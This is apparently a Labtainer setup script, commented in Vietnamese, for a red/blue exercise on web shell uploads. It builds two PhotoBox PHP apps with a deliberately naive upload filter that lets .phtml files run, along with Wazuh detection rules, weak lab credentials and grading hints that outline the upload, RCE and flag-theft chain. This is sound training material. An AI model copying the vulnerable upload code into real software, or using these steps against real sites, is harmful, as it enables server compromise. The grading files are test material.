# Dat phan dieu tra khi dung >= 4/5
webshell_dieutra = count_greater : 3 : (d1, d2, d3, d4, d5)

# ===== UNG PHO BLUE + KHAI THAC RED (giu nguyen logic cham) =====
# BLUE: he A HET RCE (.phtml khong con thuc thi) + sach webshell + con SLA
blue_patched = boolean : ( _a_marker and _sla and_not _rce_open and_not _ws_left )
# RED: lay FLAG he B qua upload webshell -> RCE
red_flag     = boolean : _flag
# (Bo 'mission_complete' - chi la AND lap lai cua blue_patched + red_flag, khong them thong tin.
#  Dat bai = webshell_dieutra Y + blue_patched Y + red_flag Y.)
__EOF_WS_9x2k__
cat > "$LAB/instr_config/results.config" <<'__EOF_WS_9x2k__'
# results.config - Hybrid Web Shell Upload -> RCE (PhotoBox)
# Chi cham VIEC SINH VIEN LAM; prestop in tho; flag ca nhan hoa xac minh TREN he B.

# --- DIEU TRA (Blue) - phieu ~/dieu-tra.txt tren he A (dang D1=..D5=) ---
_d1 = targeta:prestop.stdout : GROUP : 1 : REGEX : D1\s*=\s*([0-9]+)
_d2 = targeta:prestop.stdout : GROUP : 1 : REGEX : D2\s*=\s*([0-9]+)
_d3 = targeta:prestop.stdout : GROUP : 1 : REGEX : D3\s*=\s*([0-9]+)
_d4 = targeta:prestop.stdout : GROUP : 1 : REGEX : D4\s*=\s*([0-9]+)
_d5 = targeta:prestop.stdout : GROUP : 1 : REGEX : D5\s*=\s*([0-9]+)

# --- UNG PHO BLUE (he A) ---
_a_marker = targeta:prestop.stdout : FILE_REGEX : PRESTOP_MARKER_A
# SLA: upload anh jpg hop le van OK (app con chay dung)
_sla      = targeta:prestop.stdout : FILE_REGEX : SLA_OK
# Con RCE: upload .phtml van thuc thi duoc?
_rce_open = targeta:prestop.stdout : FILE_REGEX : A_RCE_OPEN
# Con file webshell cua ke tan cong trong uploads/?
_ws_left  = targeta:prestop.stdout : FILE_REGEX : A_WS_LEFT

# --- KHAI THAC RED (he B) ---
_flag   = targetb:prestop.stdout : FILE_REGEX : FLAG_OK

# --- Goi y checkwork ---
#CHECK_TRUE: Dich vu A phai con tai anh hop le (SLA). Dung va qua tay lam hong upload anh that.
cw_sla = targeta:prestop.stdout : FILE_REGEX : SLA_OK
#CHECK_FALSE: Van RCE duoc - upload .phtml van thuc thi. Hay VA GOC: allowlist duoi anh + getimagesize(), HOAC tat PHP o uploads (.htaccess).
cw_rce = targeta:prestop.stdout : FILE_REGEX : A_RCE_OPEN
#CHECK_FALSE: Con file webshell trong uploads/ (ke ca file AN dang .phtml). Hay 'ls -la' va xoa het.
cw_ws = targeta:prestop.stdout : FILE_REGEX : A_WS_LEFT
#CHECK_TRUE: Chua lay duoc FLAG he B (upload .phtml -> RCE -> cat /var/lib/photobox/flag.txt -> nop /submit.php?flag=).
cw_flag = targetb:prestop.stdout : FILE_REGEX : FLAG_OK
__EOF_WS_9x2k__
mkdir -p "$LAB/siem/_bin"
cat > "$LAB/siem/_bin/fixlocal.sh" <<'__EOF_WS_9x2k__'
#!/bin/bash
# soc-wazuh da cai san Wazuh. Quyen cac user Wazuh duoc khoi phuc o /entrypoint.sh (PID 1, TRUOC systemd),
# nen o day KHONG chown gi (chown /var/lib luc dang chay se hong node.lock cua OpenSearch).
# systemd tu khoi dong indexer/manager/filebeat/dashboard luc boot. (Da bake anh chung -> khong goi wazuh-setup.)
exit 0
__EOF_WS_9x2k__
cat > "$LAB/siem/_bin/prestop" <<'__EOF_WS_9x2k__'
#!/bin/bash
# prestop siem: chup bang chung Wazuh phat hien tan cong upload webshell vao he A.
# (Bang chung forensic cho GVHD doc; cham diem Blue o targeta prestop.)
trap "echo Timed out; exit" SIGTERM

echo "=== wazuh alerts (FIM them file .phtml trong uploads/, GET ?cmd=, tu 172.20.0.5) ==="
sudo -n cat /var/ossec/logs/alerts/alerts.log 2>/dev/null \
  | grep -iE "uploads|\.phtml|\.phar|\.pht|cmd=|upload\.php|172\.20\.0\.5|syscheck|added" | tail -60

echo "=== agents ==="
sudo -n /var/ossec/bin/agent_control -l 2>/dev/null
__EOF_WS_9x2k__
mkdir -p "$LAB/siem"
cat > "$LAB/siem/wazuh-setup.sh" <<'__EOF_WS_9x2k__'
#!/bin/bash
# Chay boi root o lan boot dau (goi tu fixlocal.sh). Cai Wazuh OFFLINE tu goi da bake san.
# Khong can internet. Tien do ghi vao /var/log/wazuh-install.log
cd /root/wz 2>/dev/null || cd /root
echo "[wazuh-setup] Cai Wazuh OFFLINE, bat dau luc $(date)" > /var/log/wazuh-install.log
bash wazuh-install.sh -a -o >> /var/log/wazuh-install.log 2>&1
echo "[wazuh-setup] Hoan tat luc $(date)" >> /var/log/wazuh-install.log
# Trich mat khau admin ra file de tien tra cuu
tar -O -xf /root/wz/wazuh-install-files.tar wazuh-install-files/wazuh-passwords.txt 2>/dev/null \
  | grep -A1 "'admin'" > /root/wazuh-admin-credentials.txt 2>/dev/null
__EOF_WS_9x2k__
mkdir -p "$LAB/targeta/_bin"
cat > "$LAB/targeta/_bin/fixlocal.sh" <<'__EOF_WS_9x2k__'
#!/bin/bash
# targeta (he A - PhotoBox upload), quyen 'ubuntu'. $1 = mat khau sudo.
# App THAT: upload "anh dai dien". LO HONG: blocklist ngay tho (chi chan duoi 'php',
# quen .phtml/.phar/.pht) + uploads/ thuc thi PHP -> upload .phtml = webshell = RCE.
# He A KHONG chua flag that (chi sentinel). Flag that o he B.
PW="$1"
S(){ echo "$PW" | sudo -S "$@"; }
mkdir -p /tmp/pb

cat > /tmp/pb/index.php <<'PHP'
<?php
$dir=__DIR__.'/uploads';
function h($t){ echo "<!doctype html><html><head><meta charset=utf-8><title>".$t." - PhotoBox</title><style>body{font-family:system-ui,Arial,sans-serif;max-width:720px;margin:24px auto;padding:0 16px;color:#222}h1,h2{color:#2a4d7a}a{color:#1a7f5a;text-decoration:none}button{background:#2a4d7a;color:#fff;padding:8px 16px;border:0;border-radius:4px;cursor:pointer}.card{border:1px solid #e0e0e0;border-radius:8px;padding:14px;margin:10px 0}</style></head><body>"; }
h('Trang chu');
echo "<h1>PhotoBox</h1><p>Dich vu tai len va chia se anh dai dien.</p>";
echo "<div class=card><h2>Tai anh len</h2><form method=post action=upload.php enctype=\"multipart/form-data\"><input type=file name=avatar><br><br><button>Tai len</button></form></div>";
echo "<div class=card><h2>Anh da tai</h2><ul>";
foreach(glob($dir.'/*') as $f){ $b=basename($f); echo "<li><a href=\"uploads/".rawurlencode($b)."\">".htmlspecialchars($b)."</a></li>"; }
echo "</ul></div></body></html>";
PHP

cat > /tmp/pb/upload.php <<'PHP'
<?php
$dir=__DIR__.'/uploads';
if(!is_dir($dir)){ @mkdir($dir,0775,true); }
if((isset($_SERVER['REQUEST_METHOD'])?$_SERVER['REQUEST_METHOD']:'')==='POST'
   && isset($_FILES['avatar']) && $_FILES['avatar']['error']===0){
  $name=basename($_FILES['avatar']['name']);
  // ===== LO HONG: blocklist NGAY THO - chi chan dung duoi 'php' =====
  // (quen .phtml/.phar/.pht; cung khong kiem MIME/noi dung anh)
  $parts=explode('.',$name);
  $ext=strtolower(end($parts));
  if($ext==='php'){
    http_response_code(403);
    echo "TU CHOI: khong cho tai file .php (BLOCK_PHP)";
    exit;
  }
  $dest=$dir.'/'.$name;
  if(@move_uploaded_file($_FILES['avatar']['tmp_name'],$dest)){
    echo "DA TAI LEN: <a href=\"uploads/".htmlspecialchars($name)."\">uploads/".htmlspecialchars($name)."</a> (UPLOAD_OK)";
  } else { http_response_code(500); echo "LOI khi luu file."; }
  exit;
}
header('Location: index.php');
PHP

# --- Trien khai webroot ---
S mkdir -p /var/www/html/uploads
S cp /tmp/pb/index.php /tmp/pb/upload.php /var/www/html/
S rm -f /var/www/html/index.html 2>/dev/null

# Sentinel he A (khong phai flag that)
S mkdir -p /var/lib/photobox
S bash -c 'echo "A_SENTINEL_NOT_A_FLAG" > /var/lib/photobox/secret.txt; chmod 644 /var/lib/photobox/secret.txt'

# Apache: cho .htaccess co hieu luc (de SV co the va bang .htaccess) - AllowOverride All
S bash -c 'cat > /etc/apache2/conf-available/photobox.conf <<CONF
<Directory /var/www/html>
    AllowOverride All
    Options -Indexes +FollowSymLinks
</Directory>
CONF'
S a2enconf photobox 2>/dev/null || true

# analyst so huu CODE PHP (sua upload.php khong can sudo); uploads: analyst so huu THU MUC,
# www-data (group) ghi duoc -> apache upload duoc, analyst xoa duoc webshell.
S useradd -m -s /bin/bash analyst 2>/dev/null
S bash -c 'echo "analyst:analyst" | chpasswd'
S chown -R analyst:analyst /var/www/html
S chown analyst:www-data /var/www/html/uploads
S chmod 775 /var/www/html/uploads

# Cho prestop (chay quyen ubuntu) don file test cua chinh no
S bash -c 'echo "ubuntu ALL=(ALL) NOPASSWD: /bin/rm, /usr/bin/rm" > /etc/sudoers.d/labtainer-webshell; chmod 440 /etc/sudoers.d/labtainer-webshell'

# Apache + rsyslog
S systemctl enable apache2 2>/dev/null || true
S systemctl restart apache2 2>/dev/null || S service apache2 restart 2>/dev/null || true
S service rsyslog start 2>/dev/null || S systemctl start rsyslog 2>/dev/null || true

# Wazuh agent: FIM realtime uploads/ + doc access.log apache
S bash -c "sed -i 's#</ossec_config>#<syscheck><directories realtime=\"yes\" check_all=\"yes\" report_changes=\"yes\">/var/www/html/uploads</directories></syscheck><localfile><log_format>apache</log_format><location>/var/log/apache2/access.log</location></localfile></ossec_config>#' /var/ossec/etc/ossec.conf" 2>/dev/null
S systemctl restart wazuh-agent 2>/dev/null || S service wazuh-agent restart 2>/dev/null || true

# Khung phieu dieu tra (Blue) - SV chi dien SO sau moi dau '='. Chi tao neu chua co
# -> khong de len dap an SV neu fixlocal chay lai.
S bash -c '[ -f /home/analyst/dieu-tra.txt ] || { printf "# Phieu dieu tra (Blue) - dien SO sau moi dau \"=\" (xem goi y trong read_first)\nD1=\nD2=\nD3=\nD4=\nD5=\n" > /home/analyst/dieu-tra.txt; chown analyst:analyst /home/analyst/dieu-tra.txt; chmod 644 /home/analyst/dieu-tra.txt; }'

exit 0
__EOF_WS_9x2k__
cat > "$LAB/targeta/_bin/prestop" <<'__EOF_WS_9x2k__'
#!/bin/bash
# prestop he A (Blue). Chay quyen 'ubuntu'. Chi in co/OK, khong lo dap an.
#   SLA_OK     : upload anh jpg HOP LE van thanh cong (app con chay dung)
#   A_RCE_OPEN : upload file .phtml test -> VAN THUC THI duoc (chua va goc)
#   A_WS_LEFT  : con file webshell (php/phtml/phar/pht) cua ke tan cong trong uploads/
#   (phieu dieu tra D1..D5 in THO o cuoi -> cham o goals.config)
# Phan biet THUC THI vs LO SOURCE bang phep tinh: chi khi PHP chay moi ra tong.
trap "echo Timed out; exit" SIGTERM

echo "PRESTOP_MARKER_A"
B="http://localhost"
UP="/var/www/html/uploads"
TMP="/tmp/pb.$$"; mkdir -p "$TMP"

# JPEG 1x1 hop le (cho SLA)
JPG='/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAUDBAQEAwUEBAQFBQUGBwwIBwcHBw8LCwkMEQ8SEhEPERETFhwXExQaFRERGCEYGh0dHx8fExciJCIeJBweHx7/2wBDAQUFBQcGBw4ICA4eFBEUHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh7/wAARCAACAAIDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwC9RRRX50fpB//Z'

# --- SLA: upload anh jpg hop le ---
echo "$JPG" | base64 -d > "$TMP/sla.jpg" 2>/dev/null
R=$(curl -s -m 8 -F "avatar=@$TMP/sla.jpg;type=image/jpeg;filename=sla_$$.jpg" "$B/upload.php" 2>/dev/null)
echo "$R" | grep -q 'UPLOAD_OK' && echo "SLA_OK"

# --- A_RCE_OPEN: upload test .phtml, kiem THUC THI (phep cong chi ra khi PHP chay) ---
N=$RANDOM; SUM=$((N+1337))
printf '<?php echo %d+1337; ?>' "$N" > "$TMP/zzck.phtml"
RU=$(curl -s -m 8 -F "avatar=@$TMP/zzck.phtml;type=image/jpeg;filename=zzck_$$.phtml" "$B/upload.php" 2>/dev/null)
if echo "$RU" | grep -q 'UPLOAD_OK'; then
  OUT=$(curl -s -m 8 "$B/uploads/zzck_$$.phtml" 2>/dev/null)
  echo "$OUT" | grep -q "$SUM" && echo "A_RCE_OPEN"
fi
sudo -n rm -f "$UP/zzck_$$.phtml" 2>/dev/null
rm -f "$TMP/zzck.phtml"

# --- A_WS_LEFT: con webshell thuc thi duoc cua attacker (duoi php-family la DUOI CUOI) ---
LEFT=$(find "$UP" -maxdepth 1 -type f -regextype posix-extended -iregex '.*\.(php|phtml|phar|pht|php[0-9])$' 2>/dev/null | wc -l)
[ "$LEFT" -gt 0 ] && echo "A_WS_LEFT"

# --- Phieu dieu tra Blue (in THO, cham o goals.config - khong tu phan o day) ---
echo "=== dieu-tra (phieu Blue cua analyst) ==="
sudo -n cat /home/analyst/dieu-tra.txt 2>/dev/null
cat /home/analyst/dieu-tra.txt 2>/dev/null

rm -rf "$TMP"
exit 0
__EOF_WS_9x2k__
cat > "$LAB/targeta/_bin/treataslocal" <<'__EOF_WS_9x2k__'
apache2
__EOF_WS_9x2k__
mkdir -p "$LAB/targetb/_bin"
cat > "$LAB/targetb/_bin/fixlocal.sh" <<'__EOF_WS_9x2k__'
#!/bin/bash
# targetb (he B - PhotoBox "production"), quyen 'ubuntu'. $1 = mat khau sudo.
# Giong he A (cung ma nguon, cung lo hong) nhung CHUA VA + co FLAG that + /submit.php.
# Chi HTTP (khong SSH). SV upload webshell .phtml -> RCE -> doc flag -> nop /submit.php.
PW="$1"
S(){ echo "$PW" | sudo -S "$@"; }
mkdir -p /tmp/pb

cat > /tmp/pb/index.php <<'PHP'
<?php
$dir=__DIR__.'/uploads';
function h($t){ echo "<!doctype html><html><head><meta charset=utf-8><title>".$t." - PhotoBox</title><style>body{font-family:system-ui,Arial,sans-serif;max-width:720px;margin:24px auto;padding:0 16px;color:#222}h1,h2{color:#2a4d7a}a{color:#1a7f5a;text-decoration:none}button{background:#2a4d7a;color:#fff;padding:8px 16px;border:0;border-radius:4px;cursor:pointer}.card{border:1px solid #e0e0e0;border-radius:8px;padding:14px;margin:10px 0}</style></head><body>"; }
h('Trang chu');
echo "<h1>PhotoBox (production)</h1><p>Dich vu tai len va chia se anh dai dien.</p>";
echo "<div class=card><h2>Tai anh len</h2><form method=post action=upload.php enctype=\"multipart/form-data\"><input type=file name=avatar><br><br><button>Tai len</button></form></div>";
echo "<div class=card><h2>Anh da tai</h2><ul>";
foreach(glob($dir.'/*') as $f){ $b=basename($f); echo "<li><a href=\"uploads/".rawurlencode($b)."\">".htmlspecialchars($b)."</a></li>"; }
echo "</ul></div></body></html>";
PHP

cat > /tmp/pb/upload.php <<'PHP'
<?php
$dir=__DIR__.'/uploads';
if(!is_dir($dir)){ @mkdir($dir,0775,true); }
if((isset($_SERVER['REQUEST_METHOD'])?$_SERVER['REQUEST_METHOD']:'')==='POST'
   && isset($_FILES['avatar']) && $_FILES['avatar']['error']===0){
  $name=basename($_FILES['avatar']['name']);
  $parts=explode('.',$name); $ext=strtolower(end($parts));
  if($ext==='php'){ http_response_code(403); echo "TU CHOI: khong cho tai file .php (BLOCK_PHP)"; exit; }
  $dest=$dir.'/'.$name;
  if(@move_uploaded_file($_FILES['avatar']['tmp_name'],$dest)){
    echo "DA TAI LEN: <a href=\"uploads/".htmlspecialchars($name)."\">uploads/".htmlspecialchars($name)."</a> (UPLOAD_OK)";
  } else { http_response_code(500); echo "LOI khi luu file."; }
  exit;
}
header('Location: index.php');
PHP

cat > /tmp/pb/submit.php <<'PHP'
<?php
// "Gameserver": SV nop FLAG (doc duoc qua webshell RCE) -> B tu so voi bi mat cua chinh no.
$flag=@trim(@file_get_contents('/var/lib/photobox/flag.txt'));
$f=trim(isset($_REQUEST['flag'])?$_REQUEST['flag']:'');
echo "<!doctype html><meta charset=utf-8><body style='font-family:system-ui,Arial;max-width:640px;margin:24px auto'>";
if($f!=='' && $f===$flag){ @file_put_contents('/tmp/.flagok','1'); @chmod('/tmp/.flagok',0644); echo "<p>FLAG: <b>DUNG</b>.</p>"; }
elseif($f!==''){ echo "<p>FLAG: sai.</p>"; }
else { echo "<p>Gui ?flag=FLAG-xxxxxx</p>"; }
echo "<p><a href=index.php>Trang chu</a></p></body>";
PHP

# --- Trien khai webroot ---
S mkdir -p /var/www/html/uploads
S cp /tmp/pb/index.php /tmp/pb/upload.php /tmp/pb/submit.php /var/www/html/
S rm -f /var/www/html/index.html 2>/dev/null
# uploads www-data ghi duoc (apache luu file upload)
S chown -R www-data:www-data /var/www/html/uploads
S chmod 755 /var/www/html/uploads

# FLAG that (ca nhan hoa), luu NGOAI webroot -> phai RCE moi doc duoc (khong GET truc tiep)
S mkdir -p /var/lib/photobox
S bash -c 'echo "FLAG-FLAGVAL" > /var/lib/photobox/flag.txt; chmod 644 /var/lib/photobox/flag.txt; chown www-data:www-data /var/lib/photobox/flag.txt'

# Apache
S systemctl enable apache2 2>/dev/null || true
S systemctl restart apache2 2>/dev/null || S service apache2 restart 2>/dev/null || true

exit 0
__EOF_WS_9x2k__
cat > "$LAB/targetb/_bin/prestop" <<'__EOF_WS_9x2k__'
#!/bin/bash
# prestop he B (Red): SV nop FLAG qua /submit.php -> B tu so voi flag that cua chinh no.
# SV phai RCE (upload .phtml) moi doc duoc flag -> khong the doan.
trap "echo Timed out; exit" SIGTERM

echo "PRESTOP_MARKER_B"
[ -f /tmp/.flagok ] && echo "FLAG_OK" || echo "FLAG_NO"

exit 0
__EOF_WS_9x2k__
cat > "$LAB/targetb/_bin/treataslocal" <<'__EOF_WS_9x2k__'
apache2
__EOF_WS_9x2k__
echo ">> Cap quyen thuc thi + chuan hoa EOL (LF)"
chmod +x "$LAB"/attacker/_bin/*.sh "$LAB"/attacker/*.sh "$LAB"/targeta/_bin/* "$LAB"/targetb/_bin/* "$LAB"/siem/_bin/* "$LAB"/defender/_bin/*.sh "$LAB"/siem/*.sh 2>/dev/null || true
find "$LAB" -type f -exec sed -i 's/\r$//' {} +
echo ">> XONG. Tiep theo:  cd \$LABTAINER_DIR/scripts/labtainer-student && rebuild soc-webshell"
echo ">> (siem da bake anh chung soc-wazuh - KHONG can apply-shared-siem. Can co localhost:5000/soc-wazuh:latest)"
